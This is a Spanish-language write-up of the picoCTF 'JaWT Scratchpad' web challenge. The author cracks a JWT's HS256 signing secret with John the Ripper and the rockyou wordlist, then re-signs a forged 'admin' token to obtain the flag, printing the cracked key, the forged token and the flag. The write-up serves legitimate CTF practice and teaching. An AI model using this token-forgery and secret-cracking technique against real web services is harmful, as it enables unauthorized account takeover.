# Objetivo

¡Consulta el bloc de notas del administrador! https://jupiter.challenges.picoctf.org/problem/58210/ o http://jupiter.challenges.picoctf.org:58210
1. ¿Qué es esa galleta?
2. ¿Has oído hablar de JWT?

## Solución

Si tratamos de loguearnos en JaWT con `admin`, nos arroja el siguiente mensaje:
```
YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.
```
Si nos logueamos con un usuario que no sea admin, pues podemos entrar normal:
```
## Hello Jesus!

Here is your JaWT scratchpad!
```
Analizamos la cookie que se genero al loguearnos y vemos lo que hay en la  seccion JWT:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmVzdXMifQ.ZKrokAW0nvL7frSu38j37INQG4tpTUFJ2E5kiVf1fuY
```
Decodificamos este texto en Base 64:
```
HEADER:
{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:
{
  "user": "Jesus"
}
VERIFY SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),  
)
```
Ahora, cambiamos el apartado `user`, sustituyendo por `admin` y copiamos el texto codificado modificado, para agregarlo en la cookie. Nos muesta el siguiente resultado:
```
# Internal Server Error

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```
Observamos que no nos permitió entrar. Para volver a internar, borramos la cookie y procedemos a editar la firma.
Una vez dentro, vamos a la cookie de JWT que se creo, esto es lo que obtuvimos:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmVzdXMifQ.ZKrokAW0nvL7frSu38j37INQG4tpTUFJ2E5kiVf1fuY
```
Lo guardamos en un archivo que llamamos `hash`, y luego vamos a a herramienta que nos deja la pagina en la parte inferior, llamada `John the Ripper`.

Ahora, vamos a verificar que tengamos la lista de palabras que vamos a usar en el ataque direccionario.
```
   
┌──(jesus㉿KaliJesus)-[~]
└─$ cat hash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmVzdXMifQ.ZKrokAW0nvL7frSu38j37INQG4tpTUFJ2E5kiVf1fuY
	
┌──(jesus㉿KaliJesus)-[~]
└─$ ls /usr/share/wordlists
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt.gz  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt      wifite.txt
  
┌──(jesus㉿KaliJesus)-[~]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
gzip: /usr/share/wordlists/rockyou.txt: Permission denied
  
┌──(jesus㉿KaliJesus)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
[sudo] contraseña para jesus: 
  
┌──(jesus㉿KaliJesus)-[~]
└─$ ls /usr/share/wordlists                         
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt   wifite.txt
  
┌──(jesus㉿KaliJesus)-[~]
└─$ 
```
Una ves hecho esto, vamos a ingresar el siguiente comando:
```
┌──(jesus㉿KaliJesus)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-sha256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:00 DONE (2024-03-05 18:29) 1.315g/s 9733Kp/s 9733Kc/s 9733KC/s iluve.p..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(jesus㉿KaliJesus)-[~]
└─$ 
```
Vemos que arroja la palabra `ilovepico` y esta misma la usaremos para editar y firmar el token. Obtenemos esta nueva firma:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
Cambiamos el JWT de la cookie del sitio web, guardamos, cargamos y observamos que nos arroja lo siguiente:
```
## Hello admin!

Here is your JaWT scratchpad!
picoCTF{jawt_was_just_what_you_thought_44c752f5}
```
## Notas adicionales

Usamos Cookie-Editor para analizar la cookie en la sección JWT, para modificar la sección de Payload y luego modificar la cookie para intentar loguearnos.
Esta ultima acción, no funciona porque la firma no coincide y por tanto no nos permite loguearnos.

Esta firma se encuentra en la sección VERIFY SIGNATURE de la cookie de JWT.
La firma tiene un password que desconocemos, por tanto debemos proceder a hackearla.

Usando la herramienta `John de Ripper`, para cracking de contraseñas (en nuestro caso de hashes), vamos a usar un ataque direccionario para lograr obtener la contraseña que tenemos que usar para firmar nuestro toquen de tal manera que, podamos modificarlo y se pueda firmar para validarlo correctamente.

Debemos tener instalada tambien la herramienta `john`, con el siguiente comando:
```
┌──(jesus㉿KaliJesus)-[~]
└─$ sudo apt install john 
```
Este es el comando usado para crakear el archivo:
```┌──(jesus㉿KaliJesus)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-sha256
```
## Referencias

- https://jwt.io/
- https://es.wikipedia.org/wiki/JSON
- https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=es
- https://github.com/openwall/john